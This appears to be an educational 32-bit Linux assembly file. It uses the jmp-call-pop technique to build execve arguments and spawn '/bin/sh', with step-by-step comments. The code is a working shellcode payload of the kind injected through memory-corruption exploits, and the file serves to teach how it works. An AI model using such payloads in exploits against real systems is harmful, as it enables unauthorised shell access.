;This is a comment - ProgramA-execve.asm to execute "/bin/sh"

global _start

section .text
_start:

jmp short GetStringAddress      ;Redirect Execution to GetStringAddress Label

GetStringAddressReturn:

      ;Execve() Syscall
       pop esi                 ;ESI now contains the address of "/bin/shNAAAABBBB" string.
       xor eax, eax            ;zeroing EAX register.
       mov [esi + 7], al       ;null terminate string "/bin/sh" by replacing "N" with null byte.
                               ;Step 2
       mov [esi + 8], esi      ;setting the first element in argv[] array to the address of argv[0] ,
                               ;argv[0] = "/bin/sh" ,
                               ;end result is: address of "/bin/sh" will replace AAAA.
                               ;Step 3
       mov [esi + 12], eax     ;Ending argv[] array with null pointer by replacing BBBB with 00000000 ,
                               ;The same null pointer will be used by EDX to null envp[] array.
                               ;Step 4

       ;Preparing Registers For Syscall
       mov al, 11              ;setting EAX to execve syscall number 11 decimal
       mov ebx, esi            ;setting EBX to the address of the string that represents the program to run ("/bin/sh")
       lea ecx, [esi + 8 ]     ;setting ECX to the address of argv[] array.
       lea edx, [esi + 12]     ;setting EDX to the address of envp[] array.
       int 0x80                ;invoke execve syscall

GetStringAddress:
       call GetStringAddressReturn             ;Redirect execution again to GetStringAddressReturn
       db "/bin/shNAAAABBBB"                   ;AAAA will hold the address of argv[] array.
                                               ;BBBB will hold the address of envp[] array.